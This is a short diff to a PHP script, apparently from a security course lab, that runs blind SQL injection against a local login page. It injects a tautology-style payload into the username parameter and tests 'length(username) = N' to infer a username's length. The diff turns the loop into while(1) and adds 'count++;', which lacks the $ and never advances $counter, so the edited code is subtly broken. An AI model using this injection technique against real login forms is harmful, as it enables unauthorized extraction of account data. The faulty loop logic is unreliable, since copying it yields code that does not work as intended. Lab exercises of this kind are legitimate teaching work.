@@ -6,14 +6,14 @@
 //$i = 3;
 
 $counter = 0;
-while ($counter < 25)
+while (1)
 {
     $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$counter--%20";
 	
 
     $result = file_get_contents($url);
 
-	print($result);
+	//print($result);
 
 
 	if (strpos($result, 'cat') !== false) {
@@ -21,7 +21,9 @@ while ($counter < 25)
 		echo 'true';
 		echo "\n";
 		echo "size $counter";
+		break;
 	}else{
+		count++;
 		echo "\n";
 		echo "nope";
 	}
